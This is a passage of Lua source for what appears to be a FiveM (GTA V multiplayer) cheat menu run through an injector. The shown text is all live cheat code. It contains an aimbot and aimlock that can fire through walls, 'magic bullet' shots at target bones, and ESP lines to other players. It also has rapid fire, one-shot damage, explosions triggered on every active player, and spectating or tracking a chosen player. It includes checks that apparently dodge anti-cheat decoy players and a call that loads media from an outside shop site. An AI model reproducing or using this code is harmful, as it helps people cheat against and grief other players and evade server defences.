                                         if d <= SliderKeyboard["espdistance"].value then
                                                Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, SliderKeyboard["espr"].value, 255)
                                             end
                                        else
                                            Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z,  SliderKeyboard["espr"].value, 255)
                                        end
                                    end
                                end
                            end
                        end

                        if ZM_M1000.line then
                            for k, v in pairs(GetGamePool("CPed")) do
                                local selfCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                local pedCoords = Winnie_GetEntityCoords(v)

                                if ZM_M1000.icnself then
                                    ZM_M1000.self = v
                                else
                                    ZM_M1000.self = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_M1000.icnpeds then
                                    ZM_M1000.other = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_M1000.other = v
                                end

                                local d = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), pedCoords.x, pedCoords.y, pedCoords.z,true) * (1.1 - 0.2)
                                if ZM_M1000.other and ZM_M1000.self and not Winnie_IsEntityDead(v) then
                                    local antifakeplayer = GetEntityAlpha(v) <= 100
                                        if not antifakeplayer then
                                        if scriptresourceexist("gtalife-z") then
                                         if d <= math.abs(1000 * rE_Slider["Slider_espdistance_value"]) then
                                                Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                             end
                                        else
                                            Winnie_DrawLine(selfCoords.x, selfCoords.y, selfCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                        end
                                    end
                                end
                            end
                        end



                        if ZM_M1000.cnight then
                            SetWeatherTypePersist("CLEAR")
                            SetWeatherTypeNowPersist("CLEAR")
                            SetWeatherTypeNow("CLEAR")
                            SetOverrideWeather("CLEAR")
                        else
                            SetWeatherTypePersist("EXTRASUNNY")
                            SetWeatherTypeNowPersist("EXTRASUNNY")
                            SetWeatherTypeNow("EXTRASUNNY")
                            SetOverrideWeather("EXTRASUNNY")
                        end

                        if ZM_M1000.blps or ZM_KeyboardUI.Checkbox["forceradar-functionthen"] then
                            DisplayRadar(true)
                        end




                            if ZM_M1000.infiniammo or ZM_KeyboardUI.Checkbox["infiniammo-function"] then
                                weaponHash = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                                SetPedInfiniteAmmo(Winnie_PlayerPedId(), true, weaponHash)
                            else
                                SetPedInfiniteAmmo(Winnie_PlayerPedId(), false, weaponHash)
                            end

                            if ZM_M1000.shootp or ZM_KeyboardUI.Checkbox["shootteleport-function"] then
                                local GET, TEG = Winnie_GetPedLastWeaponImpactCoord(Winnie_PlayerPedId())
                                if GET then
                                    Winnie_SetEntityCoords(Winnie_PlayerPedId(), TEG)
                                end
                            end

                            if ZM_M1000.nospread or ZM_KeyboardUI.Checkbox["nospread-function"] then
                                SetPedAccuracy(PlayerPedId(), 100)
                            end


                            if ZM_KeyboardUI.Checkbox["ptfxbullet-function"] then
                                local gox_dict = "core"
                                local x, coords = Winnie_GetPedLastWeaponImpactCoord(Winnie_PlayerPedId())

                                    if x then
                                    Winnie_RequestNamedPtfxAsset(gox_dict)
                                    while not  Winnie_HasNamedPtfxAssetLoaded(gox_dict) do
                                        Wait(10)
                                    end
                                    Winnie_UseParticleFxAsset(gox_dict)
                                    Winnie_StartNetworkedParticleFxNonLoopedAtCoord("bul_glass", coords.x,coords.y,coords.z, 0, 0, 0, SliderKeyboard['ptfxscale'].value, 0, 0, 0)
                                end
                            end

                            if ZM_M1000.ptfxbullet then
                                local gox_dict = "core"
                                local x, coords = Winnie_GetPedLastWeaponImpactCoord(Winnie_PlayerPedId())

                                if x then
                                Winnie_RequestNamedPtfxAsset(gox_dict)
                                while not  Winnie_HasNamedPtfxAssetLoaded(gox_dict) do
                                    Wait(10)
                                end
                                Winnie_UseParticleFxAsset(gox_dict)
                                Winnie_StartNetworkedParticleFxNonLoopedAtCoord("bul_glass", coords.x,coords.y,coords.z, 0, 0, 0, math.abs(100 * rE_Slider["Slider_ptfxscaleweapon_value"]), 0, 0, 0)
                                end
                            end

                            if ZM_M1000.dmgplayer then
                                SetWeaponDamageModifier(GetSelectedPedWeapon(Winnie_PlayerPedId()), math.abs(100 * rE_Slider["Slider_dmgplayer_value"]))
                            end

                            if ZM_M1000.oneshot then
                                SetWeaponDamageModifier(GetSelectedPedWeapon(Winnie_PlayerPedId()), 800.940)
                            end


                            if ZM_M1000.rpdfire or ZM_KeyboardUI.Checkbox["rapidfire-function"] then
                                if Winnie_IsDisabledControlPressed(0, 257) and IsPlayerFreeAiming(PlayerId()) then
                                    local _, weapon = Winnie_GetCurrentPedWeapon(PlayerPedId())
                                    local wepent = Winnie_GetCurrentPedWeaponEntityIndex(PlayerPedId())
                                    local launchPos = Winnie_GetEntityCoords(wepent)
                                    local targetPos = Winnie_GetGameplayCamCoord() + (rot(Winnie_GetGameplayCamRot(2)) * 200.0)

                                   ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
                                   ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
                                end
                            end

                            if ZM_KeyboardUI.Checkbox["aimlock-function"] then
                                local FOV = SliderKeyboard["aimbotfov"].value / 12
                                for k, ped in pairs(GetGamePool("CPed")) do


                                    if feet2 or feet then
                                        q = GetPedBoneCoords(ped, 0x3779, 0.0, 0.0, 0.0)
                                    end

                                    if pelvis then
                                        q = GetPedBoneCoords(ped, 0x2E28, 0.0, 0.0, 0.0)
                                    end

                                    if shoulder2 then
                                        q = GetPedBoneCoords(ped, 0x1470, 0.0, 0.0, 0.0)
                                    end

                                    if shoulder then
                                        q = GetPedBoneCoords(ped, 0x90FF, 0.0, 0.0, 0.0)
                                    end

                                    if kneel then
                                        q = GetPedBoneCoords(ped, 0xB3FE, 0.0, 0.0, 0.0)
                                    end
                                    if kneer then
                                        q = GetPedBoneCoords(ped, 0x3FCF, 0.0, 0.0, 0.0)
                                    end

                                    if head then
                                        q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
                                    end

                                    local pedSelect = PlayerPedId()
                                    local justCoordsToPed = GetEntityCoords(ped)

                                    local boneCoordsAndCalculate = CalculateRotation(q - Winnie_GetGameplayCamCoord())

                                    local rotationPed = Winnie_GetEntityRotation(Winnie_PlayerPedId(), 2)
                                    if ZM_KeyboardUI.Checkbox["tgped-function"] then
                                        ZM_KeyboardUI.R = ped
                                    else
                                        ZM_KeyboardUI.R = Winnie_IsPedAPlayer(ped)
                                    end

                                    if ZM_KeyboardUI.Checkbox["pwall-function"] then
                                        ZM_KeyboardUI.b = true
                                    else
                                        ZM_KeyboardUI.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                                    end

                                    if ZM_KeyboardUI.Checkbox["tgdead-function"] then
                                        ZM_KeyboardUI.mp = Winnie_IsEntityDead(ped)
                                    else
                                        ZM_KeyboardUI.mp = not Winnie_IsEntityDead(ped)
                                    end

                                    if IsAimCamActive() and ZM_KeyboardUI.b then
                                        local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(justCoordsToPed.x, justCoordsToPed.y, justCoordsToPed.z)
                                        if ZM_KeyboardUI.R and ZM_KeyboardUI.b and ZM_KeyboardUI.mp then
                                        if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) and IsEntityOnScreen(ped) then
                                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                                            if scriptresourceexist("gtalife-z") then
                                                if not antifakeplayer then
                                                        Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                                    end
                                                else
                                                        Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            if ZM_M1000.amlck then
                                local FOV = math.abs(2 * rE_Slider["Slider_fovaimlock_value"])
                                for k, ped in pairs(GetGamePool("CPed")) do


                                    if feet2 or feet then
                                        q = GetPedBoneCoords(ped, 0x3779, 0.0, 0.0, 0.0)
                                    end

                                    if pelvis then
                                        q = GetPedBoneCoords(ped, 0x2E28, 0.0, 0.0, 0.0)
                                    end

                                    if shoulder2 then
                                        q = GetPedBoneCoords(ped, 0x1470, 0.0, 0.0, 0.0)
                                    end

                                    if shoulder then
                                        q = GetPedBoneCoords(ped, 0x90FF, 0.0, 0.0, 0.0)
                                    end

                                    if kneel then
                                        q = GetPedBoneCoords(ped, 0xB3FE, 0.0, 0.0, 0.0)
                                    end
                                    if kneer then
                                        q = GetPedBoneCoords(ped, 0x3FCF, 0.0, 0.0, 0.0)
                                    end

                                    if head then
                                        q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
                                    end

                                    local pedSelect = PlayerPedId()
                                    local justCoordsToPed = GetEntityCoords(ped)

                                    local boneCoordsAndCalculate = CalculateRotation(q - Winnie_GetGameplayCamCoord())

                                    local rotationPed = Winnie_GetEntityRotation(Winnie_PlayerPedId(), 2)
                                    if ZM_M1000.tgped then
                                        ZM_M1000.R = ped
                                    else
                                        ZM_M1000.R = Winnie_IsPedAPlayer(ped)
                                    end

                                    if ZM_M1000.pwall then
                                        ZM_M1000.b = true
                                    else
                                        ZM_M1000.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                                    end

                                    if ZM_M1000.tgdead then
                                        ZM_M1000.mp = Winnie_IsEntityDead(ped)
                                    else
                                        ZM_M1000.mp = not Winnie_IsEntityDead(ped)
                                    end

                                    if IsAimCamActive() and ZM_M1000.b and ZM_M1000.mp then
                                        local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(justCoordsToPed.x, justCoordsToPed.y, justCoordsToPed.z)
                                        if ZM_M1000.R and ZM_M1000.b and ZM_M1000.mp then
                                        if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) and IsEntityOnScreen(ped) then
                                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                                            if scriptresourceexist("gtalife-z") then
                                                if not antifakeplayer then
                                                    Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                                    end
                                                else
                                                    Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            if ZM_KeyboardUI.Checkbox["magicbullet-function"] then

                                local FOV = SliderKeyboard["aimbotfov"].value / 12
                                local ped, a, b, c, d = main()

                                if ZM_KeyboardUI.Checkbox["tgped-function"] then
                                    ZM_KeyboardUI.R = ped
                                else
                                    ZM_KeyboardUI.R = Winnie_IsPedAPlayer(ped)
                                end

                                if ZM_KeyboardUI.Checkbox["pwall-function"] then
                                    ZM_KeyboardUI.b = true
                                else
                                    ZM_KeyboardUI.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                                end

                                if ZM_KeyboardUI.Checkbox["tgdead-function"] then
                                    ZM_KeyboardUI.mp = Winnie_IsEntityDead(ped)
                                else
                                    ZM_KeyboardUI.mp = not Winnie_IsEntityDead(ped)
                                end

                                if feet2 or feet then
                                    q = GetPedBoneCoords(ped, 0x3779, 0.0, 0.0, 0.0)
                                end

                                if pelvis then
                                    q = GetPedBoneCoords(ped, 0x2E28, 0.0, 0.0, 0.0)
                                end

                                if shoulder2 then
                                    q = GetPedBoneCoords(ped, 0x1470, 0.0, 0.0, 0.0)
                                end

                                if shoulder then
                                    q = GetPedBoneCoords(ped, 0x90FF, 0.0, 0.0, 0.0)
                                end

                                if kneel then
                                    q = GetPedBoneCoords(ped, 0xB3FE, 0.0, 0.0, 0.0)
                                end
                                if kneer then
                                    q = GetPedBoneCoords(ped, 0x3FCF, 0.0, 0.0, 0.0)
                                end

                                if head then
                                    q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
                                end

                                local q = q

                                local x, y, z = table.unpack(Winnie_GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0))
                                local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(x, y, z)
                                local weapon = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), Winnie_GetEntityCoords(ped), false)


                                if ZM_KeyboardUI.R and ZM_KeyboardUI.b and ZM_KeyboardUI.mp then

                                    if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                                        if Winnie_IsPedShooting(Winnie_PlayerPedId()) then
                                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                                            if scriptresourceexist("gtalife-z") then
                                                if not antifakeplayer then
                                                    Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                                                end
                                            else
                                                Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                                            end
                                        end
                                    end
                                end
                            end

                            if ZM_M1000.aimbot then

                                local FOV = math.abs(2 * rE_Slider["Slider_fovaimlock_value"])
                                local ped, a, b, c, d = main()

                                if ZM_M1000.tgped then
                                    ZM_M1000.R = ped
                                else
                                    ZM_M1000.R = Winnie_IsPedAPlayer(ped)
                                end

                                if ZM_M1000.pwall then
                                    ZM_M1000.b = true
                                else
                                    ZM_M1000.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                                end

                                if ZM_M1000.tgdead then
                                    ZM_M1000.mp = Winnie_IsEntityDead(ped)
                                else
                                    ZM_M1000.mp = not Winnie_IsEntityDead(ped)
                                end

                                if feet2 or feet then
                                    q = GetPedBoneCoords(ped, 0x3779, 0.0, 0.0, 0.0)
                                end

                                if pelvis then
                                    q = GetPedBoneCoords(ped, 0x2E28, 0.0, 0.0, 0.0)
                                end

                                if shoulder2 then
                                    q = GetPedBoneCoords(ped, 0x1470, 0.0, 0.0, 0.0)
                                end

                                if shoulder then
                                    q = GetPedBoneCoords(ped, 0x90FF, 0.0, 0.0, 0.0)
                                end

                                if kneel then
                                    q = GetPedBoneCoords(ped, 0xB3FE, 0.0, 0.0, 0.0)
                                end
                                if kneer then
                                    q = GetPedBoneCoords(ped, 0x3FCF, 0.0, 0.0, 0.0)
                                end

                                if head then
                                    q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
                                end

                                local q = q

                                local x, y, z = table.unpack(Winnie_GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0))
                                local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(x, y, z)
                                local weapon = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), Winnie_GetEntityCoords(ped), false)


                                if ZM_M1000.R and ZM_M1000.b and ZM_M1000.mp then

                                    if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                                        if Winnie_IsPedShooting(Winnie_PlayerPedId()) then
                                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                                            if scriptresourceexist("gtalife-z") then
                                                if not antifakeplayer then
                                                    Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                                                end
                                            else
                                                Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                                            end
                                        end
                                    end
                                end
                            end

                            if ZM_M1000.drawbullet then
                                local vehicleGun = "mule"
                                local playerPedPos = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                if Winnie_IsPedShooting(Winnie_PlayerPedId()) then
                                    while not Winnie_HasModelLoaded(Winnie_GetHashKey(vehicleGun)) do
                                        CIT.Wait(0)
                                        Winnie_RequestModel(Winnie_GetHashKey(vehicleGun))
                                    end
                                    local veh = Winnie_CreateVehicle(Winnie_GetHashKey(vehicleGun), playerPedPos.x + Directionnel(Winnie_GetEntityRotation(Winnie_PlayerPedId())).x, playerPedPos.y + (5 * GetEntityForwardY(Winnie_PlayerPedId())), playerPedPos.z + Directionnel(Winnie_GetEntityRotation(Winnie_PlayerPedId())).z, Winnie_GetEntityHeading(Winnie_PlayerPedId()), true, true)
                                    SetEntityAsNoLongerNeeded(veh)
                                    Winnie_SetVehicleForwardSpeed(veh, 150.0)
                                end
                            end

                            if ZM_M1000.antihd or ZM_KeyboardUI.Checkbox["antiheadshot-function"] then
                                SetPedSuffersCriticalHits(Winnie_PlayerPedId(), false)
                            else
                                SetPedSuffersCriticalHits(Winnie_PlayerPedId(), true)
                            end

                            if ZM_M1000.hitmarker or ZM_KeyboardUI.Checkbox["hitsound-function"] then
                                    local pedSelect = Winnie_PlayerId()
                                    local pedSeleect = Winnie_PlayerPedId()
                                    local target = Winnie_GetEntityPlayerIsFreeAimingAt(pedSelect)
                                    if target and Winnie_IsPedShooting(pedSeleect) then
                                        local a = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/X2Download.com-hit-marker-Sound-Effect.mp3?aa", 1, 1)
                                        Winnie_DestroyDui(a)
                                    end
                                end

                            if ZM_M1000.speammo then
                                local pedSelect = Winnie_PlayerPedId()
                                local weaponHash = Winnie_GetSelectedPedWeapon(pedSelect)
                                Winnie_SetPedAmmo(pedSelect, weaponHash, math.floor(255 * rE_Slider["Slider_specificammo_value"]))
                            end

                            if ZM_M1000.fov or ZM_M1000.fillfov then

                                local aimbotfov = math.abs(2 * rE_Slider["Slider_fovaimlock_value"])

                                if ZM_M1000.fov then
                                    redENGINE.DrawCircle(0.50, 0.50, 200 * aimbotfov, 255, 255, 255, 255);
                                end

                                if ZM_M1000.fillfov then
                                    redENGINE.DrawCircleFilled(0.50, 0.50, 200 * aimbotfov, 255, 255, 255, 100);
                                end
                            end


                            if ZM_KeyboardUI.Checkbox["fov-function"] then
                                local widht, height = CIT.InvokeNative(0x873C9F3104101DD3, CIT.PointerValueInt(), CIT.PointerValueInt())
                                local aimbotfov = SliderKeyboard["aimbotfov"].value / 12

                                if not Winnie_HasStreamedTextureDictLoaded("mpmissmarkers256") then
                                    Winnie_RequestStreamedTextureDict("mpmissmarkers256", true)
                                end
                                Winnie_DrawSprite('zadzadazdazdazd', 'azdzaedfadaddzadazd', 0.50,  0.50, aimbotfov, aimbotfov , 0.0, 255, 255, 255, New.opacity)
                                if ZM_KeyboardUI.Checkbox["fillfov-function"] then
                                    Winnie_DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, aimbotfov / 1.90, aimbotfov * widht / height / 1.90, 0.0, 0, 0, 0, 100)
                                end
                            end


                            if ZM_M1000.wcolor then
                                local _get = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                Winnie_DrawLightWithRangeAndShadow(_get.x, _get.y, _get.z + 2.0, math.floor(255 * rE_Slider["Slider_colorr_value"]), math.floor(255 * rE_Slider["Slider_colorg_value"]), math.floor(255 * rE_Slider["Slider_colorg_value"]), math.abs(1000 * rE_Slider["Slider_valueworldcolor_value"]), 50.0)
                            end

                            if ZM_KeyboardUI.Checkbox["worldcolor-function"] then
                                local _get = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                Winnie_DrawLightWithRangeAndShadow(_get.x, _get.y, _get.z + 2.0, SliderKeyboard["espr"].value, SliderKeyboard["espg"].value, SliderKeyboard["espb"].value, 50.0)
                            end








                        if ZM_M1000.vbrajke or ZM_KeyboardUI.Checkbox["instantbrake-function"] then
                            local vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                            if vehicle then
                                if Winnie_IsControlPressed(0, 72) then
                                    Winnie_SetVehicleForwardSpeed(vehicle, 0.0)
                                end
                            end
                        end

                        if ZM_M1000.vinvisible or ZM_KeyboardUI.Checkbox["invisiblevehicle-function"] then
                            ZM_M1000.vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                            if ZM_M1000.vehicle then
                                Winnie_SetEntityVisible(ZM_M1000.vehicle, false)
                            end
                        else
                            Winnie_SetEntityVisible(ZM_M1000.vehicle, true)
                        end

                        if ZM_M1000.vnitro or ZM_KeyboardUI.Checkbox["nitro-function"] then
                            ZM_M1000.vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                            if ZM_M1000.vehicle then
                                if Winnie_IsDisabledControlPressed(0, 38) then
                                    SetVehicleBoostActive(ZM_M1000.vehicle, true)
                                    Winnie_SetVehicleForwardSpeed(ZM_M1000.vehicle, 100.0)
                                end
                            end
                        end

                        if ZM_M1000.vdrift or ZM_KeyboardUI.Checkbox["drift-function"] then
                            if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                local carspeed = GetEntitySpeed(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()) * New.kmh)

                                if carspeed <= 100.0 then
                                    if Winnie_IsControlPressed(1, 21) then
                                        Winnie_SetVehicleReduceGrip(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), true)
                                    else
                                        Winnie_SetVehicleReduceGrip(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), false)
                                    end
                                end
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["jump-function"] then
                            if IsPedSittingInAnyVehicle(Winnie_PlayerPedId()) then
                                local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                                if Winnie_IsControlJustPressed(0, 22) then
                                    Winnie_ApplyForceToEntity(get, 3, 0.0, 0.0,  SliderKeyboard["jumpspeed"].value + 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                end
                            end
                        end


                        if ZM_M1000.vjump then
                            if IsPedSittingInAnyVehicle(Winnie_PlayerPedId()) then
                                local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                                if Winnie_IsControlJustPressed(0, 22) then
                                    Winnie_ApplyForceToEntity(get, 3, 0.0, 0.0,  math.abs(50 * rE_Slider["Slider_jumpintensity_value"]), 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                end
                            end
                        end

                    if ZM_M1000.handling then
                        if IsPedSittingInAnyVehicle(Winnie_PlayerPedId()) then
                            Winnie_SetVehicleGravityAmount(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()), 30.0)
                        else
                            Winnie_SetVehicleGravityAmount(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()), 1.0)
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["boost-function"] then
                            Winnie_SetVehicleEnginePowerMultiplier(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false), SliderKeyboard["boostspeed"].value + 0.0 * 20.0)
                        end

                        if ZM_M1000.vboost then
                            Winnie_SetVehicleEnginePowerMultiplier(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),math.abs(20 * rE_Slider["Slider_jumpintensity_value"]) * 20.0)
                        end

                        if ZM_M1000.autrepair then
                            local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                            local getBody = GetVehicleBodyHealth(get)

                            if getBody <= 995.0 then
                                Winnie_SetVehicleFixed(get)
                            end
                        end

                        if ZM_M1000.rcar or ZM_KeyboardUI.Checkbox["rbwcolor-function"] then
                            local rgb = rainbow(1.0)
                            if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                Winnie_SetVehicleCustomPrimaryColour(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), rgb.r, rgb.g, rgb.b)
                                Winnie_SetVehicleCustomSecondaryColour(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), rgb.r, rgb.g, rgb.b)
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["active-function"] then
                            if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                                local r = SliderKeyboard["colorrvehicle"].value
                                local g = SliderKeyboard["colorgvehicle"].value
                                local b = SliderKeyboard["colorbvehicle"].value
                                Winnie_SetVehicleCustomPrimaryColour(get, r, g, b)
                                Winnie_SetVehicleCustomSecondaryColour(get, r, g, b)
                            end
                        end

                        if ZM_M1000.vcol then
                            if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                                local r = math.floor(255 * rE_Slider["Slider_colorvehilcer_value"])
                                local g = math.floor(255 * rE_Slider["Slider_colorvehilceg_value"])
                                local b = math.floor(255 * rE_Slider["Slider_colorvehilceb_value"])
                                Winnie_SetVehicleCustomPrimaryColour(get, r, g, b)
                                Winnie_SetVehicleCustomSecondaryColour(get, r, g, b)
                            end
                        end



                        if ZM_KeyboardUI.Checkbox["spectate-function"] then
                            local dazdazda = dazdazda
                            if not dazdazda ~= nil then
                                dazdazda = Winnie_CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                            end

                            Winnie_RenderScriptCams(1, 0, 0, 1, 1)
                            Winnie_SetCamActive(dazdazda, true)
                            Winnie_FreezeEntityPosition(PlayerPedId(), true)
                            local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                            Winnie_SetCamCoord(dazdazda, coords.x, coords.y - 3.5, coords.z + 1)
                            Citizen.CreateThread(function()
                            while Winnie_DoesCamExist(dazdazda) do
                                Wait(0)

                                if not ZM_KeyboardUI.Checkbox["spectate-function"] then
                                    Winnie_DestroyCam(dazdazda, false)
                                    Winnie_ClearTimecycleModifier()
                                    Winnie_RenderScriptCams(false, false, 0, 1, 0)
                                    Winnie_SetFocusEntity(Winnie_PlayerPedId())
                                    Winnie_FreezeEntityPosition(PlayerPedId(), false)
                                end

                                local playerPed = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                                local playerRot = Winnie_GetEntityRotation(playerPed, 2)


                                local x, y, z = table.unpack(Winnie_GetCamCoord(dazdazda))

                                local x2, y2, z2 = table.unpack(Winnie_GetPedBoneCoords(playerPed, 31086, 0.0, 0.0, 0.0))
                                Winnie_SetCamCoord(dazdazda, x2, y2 - 3.5, z2 + 1)---Winnie_GetGameplayCamCoord())
                            end
                        end)
                    end


                        if ZM_M1000.spec then
                                local dazdazda = dazdazda
                                if not dazdazda ~= nil then
                                    dazdazda = Winnie_CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                                end

                                Winnie_RenderScriptCams(1, 0, 0, 1, 1)
                                Winnie_SetCamActive(dazdazda, true)
                                Winnie_FreezeEntityPosition(PlayerPedId(), true)
                                local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                                Winnie_SetCamCoord(dazdazda, coords.x, coords.y - 3.5, coords.z + 1)
                                Citizen.CreateThread(function()
                                while Winnie_DoesCamExist(dazdazda) do
                                    Wait(0)

                                    if not ZM_M1000.spec then
                                        Winnie_DestroyCam(dazdazda, false)
                                        Winnie_ClearTimecycleModifier()
                                        Winnie_RenderScriptCams(false, false, 0, 1, 0)
                                        Winnie_SetFocusEntity(Winnie_PlayerPedId())
                                        Winnie_FreezeEntityPosition(PlayerPedId(), false)
                                    end

                                    local playerPed = Winnie_GetPlayerPed(ZM_M1000.select)
                                    local playerRot = Winnie_GetEntityRotation(playerPed, 2)


                                    local x, y, z = table.unpack(Winnie_GetCamCoord(dazdazda))

                                    local x2, y2, z2 = table.unpack(Winnie_GetPedBoneCoords(playerPed, 31086, 0.0, 0.0, 0.0))
                                    Winnie_SetCamCoord(dazdazda, x2, y2 - 3.5, z2 + 1)---Winnie_GetGameplayCamCoord())
                                end
                            end)
                        end


                        if ZM_KeyboardUI.Checkbox["find-function"] then
                            local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                            Winnie_SetNewWaypoint(coordsPlayer.x, coordsPlayer.y)
                        end

                        if ZM_M1000.fdplayer then
                            local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_M1000.select))
                            Winnie_SetNewWaypoint(coordsPlayer.x, coordsPlayer.y)
                        end

                        if ZM_KeyboardUI.Checkbox["molotvall-function"] then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = GetPlayerPed(v)
                                local coordsPed = Winnie_GetEntityCoords(pedSelect)
                                Winnie_AddExplosion(pedSelect, coordsPlayer, 3, 10000.0, true, false, 0)
                            end
                        end

                        if ZM_M1000.mtvplayer then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
